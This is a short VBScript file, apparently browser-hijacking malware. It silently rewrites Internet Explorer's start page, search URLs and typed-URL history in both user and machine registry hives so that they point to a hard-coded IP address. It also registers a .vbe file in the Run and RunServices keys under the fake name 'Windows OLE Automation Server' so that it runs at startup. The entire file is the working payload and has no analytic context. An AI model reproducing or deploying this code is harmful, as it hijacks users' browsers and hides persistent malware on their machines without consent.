On Error Resume Next
Set WSHShell = WScript.CreateObject("WScript.Shell")
FilePath = WSHShell.ExpandEnvironmentStrings("%windir%\system32\ole32aut.vbe")
HomePage="http://69.50.179.61"
SearchPage="http://69.50.179.61/se.html"
WSHShell.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", HomePage
WSHShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main\SearchURL", HomePage
WSHShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main\Search Page", SearchPage
WSHShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main\Search Bar", SearchPage
WSHShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main\Default_Search_URL", SearchPage
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", HomePage
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main\SearchURL", HomePage
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main\Search Page", SearchPage
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main\Search Bar", SearchPage
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main\Default_Search_URL", SearchPage
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Search\SearchAssistant", SearchPage
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Search\CustomizeSearch", SearchPage
WSHShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\TypedURLs\url1", HomePage
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows OLE Automation Server", FilePath
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices\Windows OLE Automation Server", FilePath
WSHShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows OLE Automation Server", FilePath


